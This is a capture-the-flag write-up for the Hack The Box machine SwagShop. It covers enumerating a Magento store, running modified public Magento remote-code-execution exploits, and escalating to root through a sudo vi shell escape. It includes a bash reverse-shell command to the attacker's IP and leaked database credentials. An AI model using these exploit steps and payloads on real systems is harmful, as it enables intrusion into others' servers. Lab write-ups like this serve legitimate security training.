# SwagShop

This is the write-up for the box SwagShop that got retired at the 28th September 2019.
My IP address was 10.10.14.5 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.140    swagshop.htb
```

## Enumeration

Starting with a Nmap scan:

```markdown
nmap -sC -sV -o nmap/swagshop.nmap 10.10.10.140
```

```markdown
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 b6:55:2b:d2:4e:8f:a3:81:72:61:37:9a:12:f6:24:ec (RSA)
|   256 2e:30:00:7a:92:f0:89:30:59:c1:77:56:ad:51:c0:ba (ECDSA)
|_  256 4c:50:d5:f2:70:c5:fd:c4:b2:f0:bc:42:20:32:64:34 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Home page
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Checking HTTP (Port 80)

On the web page there is the **Magento Demo Store** installed. This application is an Open-Source e-commerce platform written in PHP to set up stores.
The date of the copyright logo on the bottom tells, that this installation is from 2014.

![Magento Shop](https://kyuu-ji.github.io/htb-write-up/swagshop/swagshop_magento-1.png)

With the tool [Magescan](https://github.com/steverobbins/magescan) it is possible to scan Magento sites for versions and vulnerabilities.
```markdown
php magescan.phar scan:all 10.10.10.140
```

- Magento version is 1.9.0.0, 1.9.0.1
- Path _/app/etc/local.xml_ discloses a MySQL user and password:
  - root: fMVWh7bDHpgZkyfqQXreTjU9
  - dbname: swagshop

The Admin Login Panel can be found under _/index.php/admin_.

![Magento Admin Login](https://kyuu-ji.github.io/htb-write-up/swagshop/swagshop_magento-2.png)

Lets look for exploits:
```markdown
searchsploit magento
```

The interesting exploits are called:
- Magento eCommerce - Remote Code Execution
- Magento CE < 1.9.0.1 - (Authenticated) Remote Code Execution

The authenticated exploit could be useful after login in on the page but for now we use the upper one.
The RCE script has to be customized before it works:
```python
# (...)
target = "http://10.10.10.140/index.php/"
# (...)
query = q.replace("\n", "").format(username="tester", password="Pass1234")
# (...)
```
```markdown
python 37977.py
```

It runs successfully and we can login with _tester_ and _Pass1234_.

### Exploiting Magento after Login

After login in lets use the authenticated vulnerability found with searchsploit _"Magento CE < 1.9.0.1 - (Authenticated) Remote Code Execution"_.
This uses a **PHP Object Injection** vulnerability.

Lets modify the code before running it:
```python
# (...)

# Config.
username = 'tester'
password = 'Pass1234'
php_function = 'system'
install_date = 'Wed, 08 May 2019 07:23:09 +0000' # This needs to be the exact date from /app/etc/local.xml

# (...)

br.select_form(nr=0)
#br.form.new_control('text', 'login[username]', {'value': username})  # Had to manually add username control.
#br.form.fixup()
#br['login[username]'] = username
#br['login[password]'] = password

userone = br.find_control(name="login[username]", nr=0)
userone.value = username
pwnone = br.find_control(name="login[password]", nr=0)
pwnone.value = password

# (...)

request = br.open(url + 'block/tab_orders/period/1y/?isAjax=true', data='isAjax=false&form_key=' + key)

# (...)
```
```markdown
python auth-rce.py http://10.10.10.140/index.php/admin/ 'bash -c "bash -i >& /dev/tcp/10.10.14.5/443 0>&1"'
```

After modifying the code and executing it, the listener on my IP and port 443 starts a reverse shell.

## Privilege Escalation

We are logged in as _www-data_ and look if the user can execute something with sudo privileges:
```markdown
sudo -l

# Output
User www-data may run the following commands on swagshop:
    (root) NOPASSWD: /usr/bin/vi /var/www/html/*
```

This means we can execute **Vi** with root privileges as long as we append the _/var/www/html/_ folder.
```markdown
sudo vi /var/www/html/privesc
```

It is possible to execute commands directly out of Vi by going into command mode (colon) and using an exclamation point to execute the command.
```markdown
:!/bin/bash
```

In this case, executing _/bin/bash_ starts a shell as root!
